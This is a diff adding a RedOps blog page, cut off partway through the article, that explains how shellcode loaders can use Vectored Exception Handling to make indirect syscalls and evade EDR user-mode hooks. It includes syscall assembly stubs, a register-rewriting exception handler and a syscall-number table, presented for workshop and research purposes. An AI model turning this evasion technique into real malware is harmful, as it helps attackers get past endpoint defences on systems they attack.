@@ -1,0 +1,808 @@
+<html lang="en"><head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+
+        
+
+
+<title>
+    Syscalls via Vectored Exception Handling - RedOps - English
+</title>
+<meta name="referrer" content="origin-when-cross-origin">
+<meta name="description" content="">
+
+<meta property="fb:app_id" content="">
+<meta property="og:url" content="https://redops.at/en/blog/syscalls-via-vectored-exception-handling">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Syscalls via Vectored Exception Handling - RedOps">
+<meta property="og:image" content="https://redops.at/assets/images//transforms/blog/_1200x630_crop_center-center_none/Syscalls_VEH_concept.png">
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="630">
+<meta property="og:description" content="">
+<meta property="og:site_name" content="RedOps - English">
+<meta property="og:locale" content="en">
+<meta property="og:locale:alternate" content="de_AT">
+<meta property="og:locale:alternate" content="en">
+
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:site" content="">
+<meta name="twitter:url" content="https://redops.at/en/blog/syscalls-via-vectored-exception-handling">
+<meta name="twitter:title" content="Syscalls via Vectored Exception Handling - RedOps">
+<meta name="twitter:description" content="">
+<meta name="twitter:image" content="https://redops.at/assets/images//transforms/blog/_1200x600_crop_center-center_none/Syscalls_VEH_concept.png">
+
+
+<link rel="home" href="https://redops.at/en/">
+<link rel="canonical" href="https://redops.at/en/en/blog/syscalls-via-vectored-exception-handling">
+
+                                    <link rel="alternate" href="https://redops.at/blog/syscalls-via-vectored-exception-handling" hreflang="de-AT" type="text/html">
+                    
+        <link rel="shortcut icon" type="image/x-icon" href="/favicon.svg">
+        <link rel="stylesheet" href="https://redops.at/dist/assets/css-CLotB-bN.css">
+
+            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" integrity="sha512-vswe+cgvic/XBoF1OcM/TeJ2FW0OofqAVdCZiEYkd6dwGXthvkSFWOoGGJgS2CW70VK5dQM5Oh+7ne47s74VTg==" crossorigin="anonymous" referrerpolicy="no-referrer">
+
+                    <script defer="" data-domain="redops.at" src="https://plausible.io/js/plausible.js"></script>
+            </head>
+    <body id="Main">
+        <header id="Header">
+            
+<div class="header dark">
+        <a href="https://redops.at/en/" class="title fade-in instant-on">Homepage</a>
+    <div class="language-switcher">
+                                                                                                                                    <a href="https://redops.at/blog/syscalls-via-vectored-exception-handling" class="language-link ">DE</a>
+                                            <div class="language-divider  active">/</div>
+                                                                                                                                        <a href="https://redops.at/en/blog/syscalls-via-vectored-exception-handling" class="language-link active">EN</a>
+            </div>    <button type="button" class="nav-toggle close">
+        Navigation Menu
+        <div class="top-line"></div>
+        <div class="bottom-line"></div>
+    </button>
+</div>
+<nav class="nav">
+    <div class="nav-content container">
+        <ul class="nav-list">
+            <li class="nav-item">
+                <a href="https://redops.at/en/" class="nav-link glitch" data-content="Home">
+                    Home
+                </a>
+            </li>
+                                        <li class="nav-item">
+                    <a href="https://redops.at/en/about-us" class="nav-link glitch" data-content="About Us">
+                        About Us
+                    </a>
+                </li>
+                                                    <li class="nav-item">
+                    <a href="https://redops.at/en/knowledge-base" class="nav-link glitch" data-content="Knowledge Base">
+                        Knowledge Base
+                    </a>
+                </li>
+                                                    <li class="nav-item">
+                    <a href="https://redops.at/en/kontakt" class="nav-link glitch" data-content="Contact">
+                        Contact
+                    </a>
+                </li>
+                                </ul>
+        <ul class="nav-list expertise">
+                                        <li class="nav-item">
+                    <a href="https://redops.at/en/expertise" class="nav-link glitch" data-content="Services">
+                        Services
+                    </a>
+                </li>
+                                                    <li class="nav-item">
+                    <a href="https://redops.at/en/expertise/penetration-testing" class="nav-link glitch small" data-content="Penetration Test">
+                        Penetration Test
+                    </a>
+                </li>
+                            <li class="nav-item">
+                    <a href="https://redops.at/en/expertise/assumed-breach" class="nav-link glitch small" data-content="Assumed Breach">
+                        Assumed Breach
+                    </a>
+                </li>
+                            <li class="nav-item">
+                    <a href="https://redops.at/en/expertise/red-team-engagement" class="nav-link glitch small" data-content="Red Teaming">
+                        Red Teaming
+                    </a>
+                </li>
+                            <li class="nav-item">
+                    <a href="https://redops.at/en/expertise/training" class="nav-link glitch small" data-content="Workshops">
+                        Workshops
+                    </a>
+                </li>
+                    </ul>
+        <div class="contact">
+            <div class="heading">
+                Contact
+            </div>
+            <div class="address">
+                Föhrenweg 5, A-6065 Thaur
+            </div>
+            <a href="tel:+43-660-4765788" class="phone" data-plausible-event="click:phone">
+                +43 660 4765788
+            </a>
+            <a href="mailto:office@redops.at" class="email" data-plausible-event="click:email" data-plausible-props="navigation">
+                office@redops.at
+            </a>
+        </div>
+    </div>
+</nav>
+        </header>
+        <main>
+                    <div class="blog-page">
+        <div class="page-intro">
+            <a class="back" href="https://redops.at/en/knowledge-base">Previous</a>
+            <div class="content container">
+                <h1 class="h1">
+                    Syscalls via Vectored Exception Handling
+                </h1>
+                <div class="blog-text-section">
+                    <p>I've come across the term Vectored Exception Handling or Vectored Exception Handlers (VEH for short) in the context of malware development, but until now I hadn't really been able to get to grips with the term or the subject. While preparing for my upcoming <a href="https://redops.at/blog/training-endpoint-security-insights" target="_blank" rel="noreferrer noopener">Endpoint Security Insights workshop</a>, I came across the term Vectored Exception Handling again in the following article from <a href="https://cyberwarfare.live/bypassing-av-edr-hooks-via-vectored-syscall-poc/" target="_blank" rel="noreferrer noopener">cyberwarfare</a>. The article piqued my curiosity and motivated me to learn more about the topic. As always, I learn best when I write about a topic myself, prepare a presentation or something similar.<br><br> </p>
+<p>Based on cyberwarfare's article, I would like to take up the topic of vectored exception handling in the context of shellcode execution via syscalls and take a closer look at the code required for this.<br><br> </p>
+<p>First of all, I would like to thank my two colleagues Jonas Kemmner and Robert Rostek, who always actively support me and proofread my articles before publication.</p>
+<p><br><br></p>
+<h3>Disclaimer<br></h3>
+<p><br>The content of this article is intended for research purposes only and must not be used in an unethical or illegal context!</p>
+                </div>
+                                                <ul class="tags">
+                                            <li>
+                            <a class="tag glitch dark" href="https://redops.at/en/knowledge-base&amp;filter=Malware Development" data-content="Malware Development">
+                                Malware Development
+                            </a>
+                        </li>
+                                            <li>
+                            <a class="tag glitch dark" href="https://redops.at/en/knowledge-base&amp;filter=EDR Evasion" data-content="EDR Evasion">
+                                EDR Evasion
+                            </a>
+                        </li>
+                                    </ul>
+            </div>
+            <div class="share">
+                <div class="share-button">
+    Share
+    <div class="buttons">
+        <a class="social-button twitter" href="https://twitter.com/intent/tweet?text=https://redops.at/en/blog/syscalls-via-vectored-exception-handling" target="_blank" data-plausible-event="click:share" data-plausible-props="twitter">
+            Tweet
+        </a>
+        <a class="social-button linkedin" href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fredops.at%2Fen%2Fblog%2Fsyscalls-via-vectored-exception-handling" target="_blank" data-plausible-event="click:share" data-plausible-props="linkedin">
+            Post on LinkedIn
+        </a>
+        <a class="social-button facebook" href="https://www.facebook.com/sharer.php?u=https://redops.at/en/blog/syscalls-via-vectored-exception-handling" target="_blank" data-plausible-event="click:share" data-plausible-props="facebook">
+            Share on Facebook
+        </a>
+        <a class="social-button reddit" href="https://reddit.com/submit?url=https://redops.at/en/blog/syscalls-via-vectored-exception-handling&amp;title=Syscalls via Vectored Exception Handling" target="_blank" data-plausible-event="click:share" data-plausible-props="reddit">
+            Share on Reddit
+        </a>
+    </div>
+</div>
+            </div>
+        </div>
+        <div class="blog-content">
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <h3>EDR Hooks and Evasion </h3>
+<p>In principle, there are different types of API hooking, but a common form used by EDRs such as CrowdStrike, Sentinel One, Trend Micro, etc. is inline API hooking. Simply put, in this variant, the execution flow of a user-mode application is redirected to the EDR using a <code class="inline-code">5-byte</code> unconditional jump instruction <code class="inline-code">jmp</code>. This redirection allows an EDR to dynamically analyse the running application in the context of the Windows APIs and check for malicious behaviour.<br><br>In simple terms, inline API hooking can be thought of as a process-level proxy. The EDR only <code class="inline-code">return</code> to the original function and executes the <code class="inline-code">syscall</code> required to transition from user mode to kernel mode if it detects that the code and parameters being executed are not malicious.</p>
+<figure class="image-center" style="border:0px solid rgb(229,231,235);margin:0px 0px 1em;padding:0px;clear:both;color:rgb(63,77,90);font-family:'system-ui', BlinkMacSystemFont, '-apple-system';"><img src="https://redops.at/assets/images/blog/x64dbg_hook_principle.png" alt=""></figure>
+<p>From the point of view of a red team or a malicious attacker, the last thing you want is for your malware to be analysed by the EDR in this way, and possibly detected and prevented from running. For this reason, malware developers have become very creative in recent years and can now resort to a variety of different user-mode hooking evasion techniques. For example, an attacker may attempt to unhook or patch the user-mode hooked DLL, such as <code class="inline-code">ntdll.dll</code> or <code class="inline-code">kernel32.dll</code>, using various techniques.<br></p>
+<p>Alternatively or in addition, techniques such as direct or indirect syscalls can be used. For implementation, e.g. in a shellcode loader, the corresponding native APIs are used instead of the Windows APIs, e.g. <code class="inline-code">NtAllocateVirtualMemory()</code> replaces <code class="inline-code">VirtualAlloc()</code>. By directly implementing the native API or the syscall stub of the native API, the shellcode loader no longer needs to access <code class="inline-code">kernel32.dll</code> and <code class="inline-code">ntdll.dll</code> and can therefore bypass the user mode hooks. It should also be noted that EDRs place their hooks in other DLLs such as <code class="inline-code">user32.dll</code>, <code class="inline-code">win32u.dll</code>, <code class="inline-code">kernelbase.dll</code>, etc. The total number of hooks placed varies greatly from EDR to EDR. There are EDRs that place a total of 30 hooks, while other EDRs use up to 80 hooks and more.<br><br>Depending on whether direct or indirect syscalls are used, the memory area in which the <code class="inline-code">syscall</code> and <code class="inline-code">return</code> statements of the native APIs used are executed differs. When direct syscalls are used, the complete syscall stub is implemented directly in the malware using assembly instructions. Similarly, the <code class="inline-code">syscall</code> and <code class="inline-code">return</code> instructions are executed within the memory area of the malware (.exe).</p>
+        </div>
+    </div>
+</section>
+                            <section class="code-section bg-white">
+    <div class="content blog-container">
+        <div class="code-container">
+            <div class="code-header">
+                <strong class="name"></strong>
+                <button type="button" class="copy-button">
+                    Code kopieren
+                </button>
+            </div>
+                                    <pre class="code-block-outer language-armasm" tabindex="0"><code class="code-block-inner language-armasm">.<span class="token directive property">CODE</span>  <span class="token comment">; direct syscalls assembly code </span>
+<span class="token comment">; Procedure for the NtAllocateVirtualMemory syscall</span>
+NtAllocateVirtualMemory <span class="token directive property">PROC</span>
+    mov r10<span class="token punctuation">,</span> rcx                 <span class="token comment">; Move the contents of rcx to r10. This is necessary because the syscall instruction in 64-bit Windows expects the parameters to be in the r10 and rdx registers.</span>
+    mov eax<span class="token punctuation">,</span> 18h                 <span class="token comment">; Move the syscall number into the eax register.</span>
+    syscall                      <span class="token comment">; Execute syscall.</span>
+    ret                          <span class="token comment">; Return from the procedure.</span>
+NtAllocateVirtualMemory <span class="token directive property">ENDP</span>     <span class="token comment">; End of the procedure</span></code></pre>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <p>The problem from a malware developer's perspective: If a system call (direct syscall) is executed directly by a user mode application under Windows, this leads to a clear Indicator of Compromise (IOC) from the perspective of an EDR. In this case, for example, the thread call stack within an application (malware) can be analysed using Event Tracing for Windows (ETW). The following figure shows the anomaly of the stack frames within the thread call stack of a malware using direct syscalls and the different arrangement of the stack frames compared to a legitimate application. <br></p>
+<figure class="image-center" style="border:0px solid rgb(229,231,235);margin:0px 0px 1em;padding:0px;clear:both;color:rgb(63,77,90);font-family:'system-ui', BlinkMacSystemFont, '-apple-system';"><img src="https://redops.at/assets/images/blog/dsc_vs_cmd_callstack.png" alt=""></figure>
+<p><br>To work around this problem, or to make the thread call stack more legitimate within a malware, direct syscalls have been evolved into indirect syscalls. The use of indirect syscalls means that the <code class="inline-code">syscall</code> and <code class="inline-code">return</code> instructions are executed within the syscall stub in memory of <code class="inline-code">ntdll.dll</code>. This behaviour is legitimate on Windows, and compared to direct syscalls, indirect syscalls achieve a higher legitimacy of the thread call stack.&nbsp;</p><figure class="image-center"><img src="https://redops.at/assets/images/blog/callstack_direct_vs_indirect_syscalls.png" alt=""></figure>
+
+<p>This can be done programmatically in assembler using an unconditional jump instruction <code class="inline-code">jmp</code>. After the System Service Number (<code class="inline-code">SSN</code>) has been moved into the <code class="inline-code">eax</code> register using the <code class="inline-code">mov</code> instruction, the <code class="inline-code">jmp</code> instruction is used to redirect to the memory area of <code class="inline-code">ntdll.dll</code>. The <code class="inline-code">syscall</code> and <code class="inline-code">return</code> instructions are then executed at the end of the syscall stub within the memory area of <code class="inline-code">ntdll.dll</code>. </p>
+        </div>
+    </div>
+</section>
+                            <section class="code-section bg-white">
+    <div class="content blog-container">
+        <div class="code-container">
+            <div class="code-header">
+                <strong class="name"></strong>
+                <button type="button" class="copy-button">
+                    Code kopieren
+                </button>
+            </div>
+                                    <pre class="code-block-outer language-armasm" tabindex="0"><code class="code-block-inner language-armasm">.<span class="token directive property">CODE</span>  <span class="token comment">; indirect syscalls assembly code</span>
+<span class="token comment">; Procedure for the NtAllocateVirtualMemory syscall</span>
+NtAllocateVirtualMemory <span class="token directive property">PROC</span>
+    mov r10<span class="token punctuation">,</span> rcx                  <span class="token comment">; Move the contents of rcx to r10. This is necessary because the syscall instruction in 64-bit Windows expects the parameters to be in the r10 and rdx registers.</span>
+    mov eax<span class="token punctuation">,</span> 18h                  <span class="token comment">; Move the syscall number into the eax register.</span>
+    jmp <span class="token instruction keyword">QWORD</span> <span class="token instruction keyword">PTR</span> <span class="token punctuation">[</span>sysAddrNtAllocateVirtualMemory<span class="token punctuation">]</span>  <span class="token comment">; Jump to the actual syscall memory address in ntdll.dll</span>
+NtAllocateVirtualMemory <span class="token directive property">ENDP</span>      <span class="token comment">; End of the procedure</span></code></pre>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <p>However, the concept of indirect syscalls, i.e. the execution of <code class="inline-code">syscall</code> and <code class="inline-code">return</code> statements in the context of a specific native API within the memory of <code class="inline-code">ntdll.dll</code>, cannot only be achieved by implementing assembly code under C. The same behaviour can also be achieved by using <strong>V</strong><strong>ectored Exception Handling</strong>. How this works in C, for example in the context of a shellcode loader, is explained in this article based on the Cyberwarfare article.</p>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <h3>Vectored Exception Handling</h3>
+<p><a href="https://learn.microsoft.com/en-us/windows/win32/debug/vectored-exception-handling" target="_blank" rel="noreferrer noopener">Vectored Exception Handling</a> (VEH) was introduced with Windows XP and is part of the exception handling mechanism that handles errors (e.g. division by zero) and unusual conditions or exceptions (e.g. illegal memory access) that can occur during the execution of a program. Vectored Exception Handling is part of the broader Windows <a href="https://learn.microsoft.com/en-us/cpp/cpp/structured-exception-handling-c-cpp?view=msvc-170" target="_blank" rel="noreferrer noopener">Structured Exception Handling</a> (SEH) framework. Unlike SEH, which is defined specifically for a function or block of code, VEH is global to the entire application and is called before the standard structured exception handlers when an error occurs during program execution.</p>
+<p>The handler is implemented using <a href="https://learn.microsoft.com/en-us/windows/win32/api/winnt/nc-winnt-pvectored_exception_handler" target="_blank" rel="noreferrer noopener">PVECTORED_EXCEPTION_HANDLER</a>, called or registered using the Windows API <a href="https://learn.microsoft.com/en-us/windows/win32/api/errhandlingapi/nf-errhandlingapi-addvectoredexceptionhandler" target="_blank" rel="noreferrer noopener">AddVectoredExceptionHandler</a> and unregistered using <a href="https://learn.microsoft.com/en-us/windows/win32/api/errhandlingapi/nf-errhandlingapi-removevectoredexceptionhandler" target="_blank" rel="noreferrer noopener">RemoveVectoredExceptionHandler</a>. The <a href="https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-exception_record#:~:text=Members-,ExceptionCode,-The%20reason%20the" target="_blank" rel="noreferrer noopener">ExceptionCode</a> member can be used within the <a href="https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-exception_record" target="_blank" rel="noreferrer noopener">EXCEPTION_RECORD</a> structure to specify which exception should trigger the handler. With vectored exception handling, developers can implement custom and specific logic for handling exceptions such as <code class="inline-code">EXCEPTION_ACCESS_VIOLATION</code>, <code class="inline-code">EXCEPTION_BREAKPOINT</code>, <code class="inline-code">EXCEPTION_FLT_DIVIDE_BY_ZERO</code>, etc., and gain greater control over how a program responds to various error scenarios.<br><br>The following C code shows an example of how to define a VEH function using <code class="inline-code">VectoredExceptionHandler</code>. The code also shows how the Vectored Exception Handler can be registered and deregistered within the main function using <code class="inline-code">AddVectoredExceptionHandler()</code> and <code class="inline-code">RemoveVectoredExceptionHandler()</code>.</p>
+        </div>
+    </div>
+</section>
+                            <section class="code-section bg-white">
+    <div class="content blog-container">
+        <div class="code-container">
+            <div class="code-header">
+                <strong class="name"></strong>
+                <button type="button" class="copy-button">
+                    Code kopieren
+                </button>
+            </div>
+                                    <pre class="code-block-outer language-c" tabindex="0"><code class="code-block-inner language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;windows.h&gt;</span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
+
+<span class="token comment">// Prototype of the VEH function</span>
+LONG CALLBACK <span class="token function">VectoredExceptionHandler</span><span class="token punctuation">(</span>EXCEPTION_POINTERS <span class="token operator">*</span>ExceptionInfo<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment">// Implementation of the VEH function</span>
+LONG CALLBACK <span class="token function">VectoredExceptionHandler</span><span class="token punctuation">(</span>EXCEPTION_POINTERS <span class="token operator">*</span>ExceptionInfo<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token comment">// Check if it's an access violation</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>ExceptionInfo<span class="token operator">-&gt;</span>ExceptionRecord<span class="token operator">-&gt;</span>ExceptionCode <span class="token operator">==</span> EXCEPTION_ACCESS_VIOLATION<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Access violation detected!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment">// Handle the exception here</span>
+        <span class="token comment">// ...</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token comment">// Additional exceptions can be handled here</span>
+    <span class="token comment">// ...</span>
+
+    <span class="token comment">// EXCEPTION_CONTINUE_SEARCH indicates that the next handler function should be called</span>
+    <span class="token keyword">return</span> EXCEPTION_CONTINUE_SEARCH<span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token comment">// Add the Vectored Exception Handler</span>
+    PVOID handle <span class="token operator">=</span> <span class="token function">AddVectoredExceptionHandler</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> VectoredExceptionHandler<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token comment">// Normal code can be added here</span>
+    <span class="token comment">// ...</span>
+
+    <span class="token comment">// Remove the Vectored Exception Handler before exiting the program</span>
+    <span class="token function">RemoveVectoredExceptionHandler</span><span class="token punctuation">(</span>handle<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span></code></pre>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <p>However, red teams and attackers also use vectored exception handling and can obfuscate code flow or achieve accelerated shellcode execution through VEH by implementing it in their malware. For example, the following article from <a href="https://www.crowdstrike.com/blog/guloader-dissection-reveals-new-anti-analysis-techniques-and-code-injection-redundancy/" target="_blank" rel="noreferrer noopener">CrowdStrike</a> or the article from <a href="https://www.elastic.co/security-labs/getting-gooey-with-guloader-downloader" target="_blank" rel="noreferrer noopener">Elastic Security Labs</a> shows very nicely how the GULOADER malware uses vectored exception handling to obfuscate the code flow (anti-debugging) and thus make manual analysis by reverse engineering more difficult.</p>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <h3>Vectored Syscalls&nbsp;</h3>
+<p>As mentioned above, this article examines how to implement vectored exception handling in a shellcode loader for running shellcode via syscalls. I used the code from cyberwarefare, which can be found on <a href="https://github.com/RedTeamOperations/VEH-PoC/" target="_blank" rel="noreferrer noopener">Github</a>, as the basis for my shellcode loader. Since I avoid remote injection as much as possible for OPSEC reasons, I have rewritten the shellcode loader for myself so that the execution of the shellcode takes place within the loader to be executed (self injection). I don't want to publish the rewritten code here, but rather explain the principle of vectored exception handling in the context of shellcode execution using the relevant parts of the code. <br><br>What is meant by syscalls via vectored exception handling or vectored syscalls? Simply put, we want to achieve syscall execution through the vectored exception handler by defining a VEH function and deliberately throwing an exception. As we will see later, this allows us to execute shell code in the form of indirect syscalls, but without having to implement assembly instructions in the code.</p>
+<p></p>
+<figure class="image-center" style="border:0px solid rgb(229,231,235);margin:0px 0px 1em;padding:0px;clear:both;color:rgb(63,77,90);font-family:'system-ui', BlinkMacSystemFont, '-apple-system';"><img src="https://redops.at/assets/images/blog/Syscalls_VEH_concept.png" alt=""></figure>
+<p>In the following, we will look at the most important code elements needed to implement syscalls via vectored exception handling, and I will try to explain how they work as well as possible.</p>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <h4>Vectored Exception Handler Function</h4>
+<p>The first step is to look at the vectored exception handler function <code class="inline-code">PvectoredExceptionHandler()</code>, which is later called in the main function via the Windows API <code class="inline-code">AddVectoredExceptionHandler()</code>. The function is defined using <code class="inline-code">PVECTORED_EXCEPTION_HANDLER</code>. Within the function, <code class="inline-code">EXCEPTION_RECORD</code> is used to define the criterion (exception) that should trigger a pass to the vectored exception handler. More specifically, we define the value for the <code class="inline-code">ExceptionCode</code> member within <code class="inline-code">EXCEPTION_RECORD</code>. In our case, we assign the value <code class="inline-code">EXCEPTION_ACCESS_VIOLATION</code> to the <code class="inline-code">ExceptionCode</code> member. We will see later why exactly we define this exception and how it is triggered.&nbsp;</p>
+        </div>
+    </div>
+</section>
+                            <section class="code-section bg-white">
+    <div class="content blog-container">
+        <div class="code-container">
+            <div class="code-header">
+                <strong class="name"></strong>
+                <button type="button" class="copy-button">
+                    Code kopieren
+                </button>
+            </div>
+                                    <pre class="code-block-outer language-c" tabindex="0"><code class="code-block-inner language-c">// Vectored Exception Handler function
+LONG CALLBACK PvectoredExceptionHandler(PEXCEPTION_POINTERS exception_ptr) {
+    // Check if the exception is an access violation
+    if (exception_ptr-&gt;ExceptionRecord-&gt;ExceptionCode == EXCEPTION_ACCESS_VIOLATION) {
+        // Modify the thread's context to redirect execution to the syscall address
+        // Copy RCX register to R10
+        exception_ptr-&gt;ContextRecord-&gt;R10 = exception_ptr-&gt;ContextRecord-&gt;Rcx;
+
+        // Copy RIP (Instruction Pointer) to RAX (RIP keeps SSN --&gt; RAX keeps SSN)		
+        exception_ptr-&gt;ContextRecord-&gt;Rax = exception_ptr-&gt;ContextRecord-&gt;Rip;
+
+        // Set RIP to global address (set syscalls address retrieved from NtDrawText to RIP register)		
+        exception_ptr-&gt;ContextRecord-&gt;Rip = g_syscall_addr;
+
+        // Continue execution at the new instruction pointer
+        return EXCEPTION_CONTINUE_EXECUTION;
+    }
+    // Continue searching for another exception handler
+    return EXCEPTION_CONTINUE_SEARCH;
+}</code></pre>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <p>To implement syscalls via vectored exception handling, additional <code class="inline-code">exception_ptr</code> pointers must be defined within the VEH function <code class="inline-code">PvectoredExceptionHandler()</code>. Unlike before, however, the structure <a href="https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-context" target="_blank" rel="noreferrer noopener">CONTEXT</a> is used to access the desired registers <code class="inline-code">rcx</code>, <code class="inline-code">r10</code>, <code class="inline-code">rax</code>, <code class="inline-code">rip</code>. We use these pointers to form the basis for the execution of syscalls via VEH. If I have understood correctly, the structure of the VEH function <code class="inline-code">PvectoredExceptionHandler()</code> ultimately replicates the part of the syscall stub of a native API that is ultimately necessary for the preparation of the <code class="inline-code">SSN</code> and the execution of the <code class="inline-code">SSN</code> via <code class="inline-code">syscall</code>. The following diagram illustrates this analogy.</p>
+<figure class="image-center" style="border:0px solid rgb(229,231,235);margin:0px 0px 1em;padding:0px;clear:both;color:rgb(63,77,90);font-size:16px;font-style:normal;font-weight:400;letter-spacing:normal;text-indent:0px;text-transform:none;word-spacing:0px;white-space:normal;background-color:rgb(251,252,254);"><img src="https://redops.at/assets/images/blog/analogy_syscallstub2.png" alt=""></figure>
+<p>At the end of the <code class="inline-code">PvectoredExceptionHandler()</code> function, <a href="https://learn.microsoft.com/en-us/windows/win32/debug/exception-handler-syntax" target="_blank" rel="noreferrer noopener">EXCEPTION_CONTINUE_EXECUTION</a> is used to specify that after handling an exception thrown by <code class="inline-code">EXCEPTION_ACCESS_VIOLATION</code>, programm execution should continue from the point where the exception was thrown. If an exception is thrown that has not been thrown by the <code class="inline-code">EXCEPTION_ACCESS_VIOLATION</code> exception, it is passed to the next VEH function via <code class="inline-code">EXCEPTION_CONTINUE_SEARCH</code>. In our case, we have not defined another VEH function, so it would be passed to the Structured Exception Handler (SEH).</p>
+        </div>
+    </div>
+</section>
+                            <section class="code-section bg-white">
+    <div class="content blog-container">
+        <div class="code-container">
+            <div class="code-header">
+                <strong class="name"></strong>
+                <button type="button" class="copy-button">
+                    Code kopieren
+                </button>
+            </div>
+                                    <pre class="code-block-outer language-c" tabindex="0"><code class="code-block-inner language-c">// Continue execution at the new instruction pointer
+        return EXCEPTION_CONTINUE_EXECUTION;
+    }
+    // Continue searching for another exception handler
+    return EXCEPTION_CONTINUE_SEARCH;</code></pre>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <h4>Exception Triggering</h4>
+<p>After defining the VEH function, a way must be found to specifically throw the <code class="inline-code">EXCEPTION_ACCESS_VIOLATION</code> exception. To do this, all native APIs (which are declared as pointers) are initialised directly in the shellcode loader via the corresponding <code class="inline-code">SSN</code>. However, since a variable defined as a pointer, e.g. <code class="inline-code">pNtAllocateVirtualMemory</code>, should normally point to a memory address and not directly to a value, this leads to an unauthorised memory access which triggers the VEH function via <code class="inline-code">EXCEPTION_ACCESS_VIOLATION</code>.&nbsp;</p>
+        </div>
+    </div>
+</section>
+                            <section class="code-section bg-white">
+    <div class="content blog-container">
+        <div class="code-container">
+            <div class="code-header">
+                <strong class="name"></strong>
+                <button type="button" class="copy-button">
+                    Code kopieren
+                </button>
+            </div>
+                                    <pre class="code-block-outer language-c" tabindex="0"><code class="code-block-inner language-c">// Define syscall numbers for various NT API functions
+enum syscall_no {
+    SysNtAllocateVirtualMem = 0x18,    // Syscall number for NtAllocateVirtualMemory
+    SysNtWriteVirtualMem = 0x3A,       // Syscall number for NtWriteVirtualMemory
+    SysNtProtectVirtualMem = 0x50,     // Syscall number for NtProtectVirtualMemory
+    SysNtCreateThreadEx = 0xC2,        // Syscall number for NtCreateThreadEx
+    SysNtWaitForSingleObject = 0x4     // Syscall number for NtWaitForSingleObject
+};
+
+// Assign system call function pointers to their respective syscall numbers
+_NtAllocateVirtualMemory pNtAllocateVirtualMemory = (_NtAllocateVirtualMemory)SysNtAllocateVirtualMem;
+_NtWriteVirtualMemory pNtWriteVirtualMemory = (_NtWriteVirtualMemory)SysNtWriteVirtualMem;
+_NtProtectVirtualMemory pNtProtectVirtualMemory = (_NtProtectVirtualMemory)SysNtProtectVirtualMem;
+_NtCreateThreadEx pNtCreateThreadEx = (_NtCreateThreadEx)SysNtCreateThreadEx;
+_NtWaitForSingleObject pNtWaitForSingleObject = (_NtWaitForSingleObject)SysNtWaitForSingleObject;</code></pre>
+        </div>
+    </div>
+</section>
+                            <section class="blog-text-section bg-white">
+    <div class="content blog-container">
+        <div class="text">
+            <p>As also described in cyberwarefare's article, initialising the native APIs via the <code class="inline-code">SSN</code> has the advantage that an <code class="inline-code">EXCEPTION_ACCESS_VIOLATION</code> can be triggered in a targeted manner. On the other hand, it has the advantage that the <code class="inline-code">SSN</code> is cached in the <code class="inline-code">rip</code> register, passed to the vectored exception handler and then passed to the <code class="inline-code">rax</code> register within the VEH function <code class="inline-code">PvectoredExceptionHandler()</code>.<br><br>This process can be visualised very well by debugging in IDA. The following figure clearly shows how the attempt to initialise the native API <code class="inline-code">NtAllocateVirtualMemory()</code> via <code class="inline-code">SSN</code> <code class="inline-code">0x18</code> results in an invalid memory access attempt (<a href="https://stackoverflow.com/questions/17168982/exception-error-c0000005-in-vc" target="_blank" rel="noreferrer noopener">exc.code c0000005</a>), which throws the Access Violation Exception, a passing to the Vectored Exception Handler takes place, the <code class="inline-code">SSN</code> <code class="inline-code">0x18</code> is moved to the <code class="inline-code">rip</code> register and finally to the <code class="inline-code">rax</code> register.</p>
+<figure class="image-center" style="border:0px solid rgb(229,231,235);margin:0px 0px 1em;padding:0px;clear:both;color:rgb(63,77,90);font-family:'system-ui', BlinkMacSystemFont, '-apple-system';"><img src="https://redops.at/assets/images/blog/IDA_SSN_Trigger.png" alt=""></figure>
